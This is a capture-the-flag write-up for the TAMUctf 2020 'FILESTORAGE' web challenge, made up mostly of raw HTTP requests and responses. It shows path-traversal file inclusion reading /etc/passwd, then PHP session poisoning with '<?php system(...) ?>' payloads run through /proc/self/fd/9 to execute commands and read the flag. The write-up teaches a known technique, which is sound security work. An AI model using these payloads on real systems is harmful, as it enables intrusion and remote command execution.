# TAMUctf 2020 – FILESTORAGE

* **Category:** web
* **Points:** 122

## Challenge

> Try out my new file sharing site!
> 
> http://filestorage.tamuctf.com

## Solution

The website takes a `name` parameter and allows you to read some files. 

```
POST /index.php HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Origin: http://filestorage.tamuctf.com
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

name=foo

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:13:01 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 542
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	</head>
	<body>
	Hello, foo<br><ul class="list-group mx-2"><li class="list-group-item my-1"><a href='?file=beemovie.txt'>beemovie.txt</a></li><li class="list-group-item my-1"><a href='?file=hello.txt'>hello.txt</a></li><li class="list-group-item my-1"><a href='?file=pi.txt'>pi.txt</a></li></ul>	</body>
</html>
```

Analyzing the read files page, you can discover that the website is vulnerable to LFI.

```
GET /index.php?file=../../../../../../../../etc/passwd HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=k2qs029jna7vcppkeqinfh4kja
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 00:38:30 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1561
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	</head>
	<body>
	<a class="btn btn-primary" href="index.php" role="button">🡄 Go back</a><br>root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
apache:x:100:101:apache:/var/www:/sbin/nologin
	</body>
</html>
```

You can abuse this vulnerability to analyze the `/proc/self/` directory in order to how the website stores the passed `name` parameter.

```
GET /index.php?file=../../../../../../proc/self/fd/9 HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:13:55 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 357
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	</head>
	<body>
	<a class="btn btn-primary" href="index.php" role="button">🡄 Go back</a><br>name|s:3:"foo";	</body>
</html>
```

It seems that `name` is stored using PHP serialization and can be located into `/proc/self/fd/9` file. If you perform LFI to read a file including PHP code, it will be executed.

So you can pass a PHP command for the `name` value, like `<?php system('id'); ?>`.

```
POST /index.php HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://filestorage.tamuctf.com
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=boig3tsj1931578ghio3a9fder
Upgrade-Insecure-Requests: 1

name=%3C%3Fphp+system%28%27id%27%29%3B+%3F%3E

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:10:47 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 561
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	</head>
	<body>
	Hello, <?php system('id'); ?><br><ul class="list-group mx-2"><li class="list-group-item my-1"><a href='?file=beemovie.txt'>beemovie.txt</a></li><li class="list-group-item my-1"><a href='?file=hello.txt'>hello.txt</a></li><li class="list-group-item my-1"><a href='?file=pi.txt'>pi.txt</a></li></ul>	</body>
</html>
```

And then use LFI to execute it.

```
GET /index.php?file=../../../../../../proc/self/fd/9 HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=boig3tsj1931578ghio3a9fder
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:07:58 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 431
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	</head>
	<body>
	<a class="btn btn-primary" href="index.php" role="button">🡄 Go back</a><br>name|s:22:"uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
";	</body>
</html>
```

You can enumerate the folder with the following HTTP requests.

```
POST /index.php HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://filestorage.tamuctf.com
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

name=%3C%3Fphp%20system%28%27ls%20-al%27%29%3B%20%3F%3E

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:18:48 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 565
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	</head>
	<body>
	Hello, <?php system('ls -al'); ?><br><ul class="list-group mx-2"><li class="list-group-item my-1"><a href='?file=beemovie.txt'>beemovie.txt</a></li><li class="list-group-item my-1"><a href='?file=hello.txt'>hello.txt</a></li><li class="list-group-item my-1"><a href='?file=pi.txt'>pi.txt</a></li></ul>	</body>
</html>

GET /index.php?file=../../../../../../proc/self/fd/9 HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:18:54 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 681
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	</head>
	<body>
	<a class="btn btn-primary" href="index.php" role="button">🡄 Go back</a><br>name|s:26:"total 20
drwxr-xr-x    1 root     root          4096 Mar 20 01:23 .
drwxr-xr-x    1 root     root          4096 Mar 18 17:38 ..
drwxr-xr-x    2 root     root          4096 Mar 18 17:38 files
-rw-r--r--    1 root     root            45 Aug 16  2019 index.html
-rw-rw-r--    1 root     root          1141 Mar 20 01:22 index.php
";	</body>
</html>
```

You can now enumerate the root folder.

```
POST /index.php HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Origin: http://filestorage.tamuctf.com
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

name=%3C%3Fphp%20system%28%27ls%20-al%20%2F%27%29%3B%20%3F%3E

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:29:38 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 567
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	</head>
	<body>
	Hello, <?php system('ls -al /'); ?><br><ul class="list-group mx-2"><li class="list-group-item my-1"><a href='?file=beemovie.txt'>beemovie.txt</a></li><li class="list-group-item my-1"><a href='?file=hello.txt'>hello.txt</a></li><li class="list-group-item my-1"><a href='?file=pi.txt'>pi.txt</a></li></ul>	</body>
</html>

GET /index.php?file=../../../../../../proc/self/fd/9 HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:29:42 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1731
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	</head>
	<body>
	<a class="btn btn-primary" href="index.php" role="button">🡄 Go back</a><br>name|s:28:"total 244
drwxr-xr-x    1 root     root          4096 Mar 20 01:55 .
drwxr-xr-x    1 root     root          4096 Mar 20 01:55 ..
-rwxr-xr-x    1 root     root             0 Mar 20 01:55 .dockerenv
drwxr-xr-x    2 root     root          4096 Jan 16 21:52 bin
drwxr-xr-x    5 root     root           340 Mar 20 01:55 dev
drwxr-xr-x    1 root     root          4096 Mar 20 01:55 etc
drwxr-xr-x    1 root     root          4096 Mar 20 01:23 flag_is_here
drwxr-xr-x    2 root     root          4096 Jan 16 21:52 home
drwxr-xr-x    1 root     root          4096 Mar 18 17:38 lib
drwxr-xr-x    5 root     root          4096 Jan 16 21:52 media
drwxr-xr-x    2 root     root          4096 Jan 16 21:52 mnt
drwxr-xr-x    2 root     root          4096 Jan 16 21:52 opt
dr-xr-xr-x  504 root     root             0 Mar 20 01:55 proc
drwx------    2 root     root          4096 Jan 16 21:52 root
drwxr-xr-x    1 root     root          4096 Mar 18 17:38 run
drwxr-xr-x    2 root     root          4096 Jan 16 21:52 sbin
drwxr-xr-x    2 root     root          4096 Jan 16 21:52 srv
-rw-rw-r--    1 root     root            36 Mar 18 17:37 start.sh
dr-xr-xr-x   13 root     root             0 Mar 20 01:16 sys
drwxrwxrwt    1 root     root        167936 Mar 20 02:29 tmp
drwxr-xr-x    1 root     root          4096 Jan 16 21:52 usr
drwxr-xr-x    1 root     root          4096 Mar 18 17:38 var
";	</body>
</html>
```

So you can discover the `/flag_is_here` folder and enumerate it.

```
POST /index.php HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: http://filestorage.tamuctf.com
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

name=%3C%3Fphp%20system%28%27ls%20-al%20%2Fflag_is_here%27%29%3B%20%3F%3E

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:31:03 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 579
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	</head>
	<body>
	Hello, <?php system('ls -al /flag_is_here'); ?><br><ul class="list-group mx-2"><li class="list-group-item my-1"><a href='?file=beemovie.txt'>beemovie.txt</a></li><li class="list-group-item my-1"><a href='?file=hello.txt'>hello.txt</a></li><li class="list-group-item my-1"><a href='?file=pi.txt'>pi.txt</a></li></ul>	</body>
</html>

GET /index.php?file=../../../../../../proc/self/fd/9 HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:31:07 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 549
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	</head>
	<body>
	<a class="btn btn-primary" href="index.php" role="button">🡄 Go back</a><br>name|s:40:"total 12
drwxr-xr-x    1 root     root          4096 Mar 20 01:23 .
drwxr-xr-x    1 root     root          4096 Mar 20 01:55 ..
-rw-rw-r--    1 root     root            29 Mar 18 17:37 flag.txt
";	</body>
</html>
```

And finally print `/flag_is_here/flag.txt` file.

```
POST /index.php HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Origin: http://filestorage.tamuctf.com
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

name=%3C%3Fphp%20system%28%27cat%20%2Fflag_is_here%2Fflag.txt%27%29%20%3F%3E

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:33:17 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 584
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	</head>
	<body>
	Hello, <?php system('cat /flag_is_here/flag.txt') ?><br><ul class="list-group mx-2"><li class="list-group-item my-1"><a href='?file=beemovie.txt'>beemovie.txt</a></li><li class="list-group-item my-1"><a href='?file=hello.txt'>hello.txt</a></li><li class="list-group-item my-1"><a href='?file=pi.txt'>pi.txt</a></li></ul>	</body>
</html>

GET /index.php?file=../../../../../../proc/self/fd/9 HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:33:48 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 384
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
	</head>
	<body>
	<a class="btn btn-primary" href="index.php" role="button">🡄 Go back</a><br>name|s:45:"gigem{535510n_f1l3_p0150n1n6}";	</body>
</html>
```

So the flag is the following.

```
gigem{535510n_f1l3_p0150n1n6}
```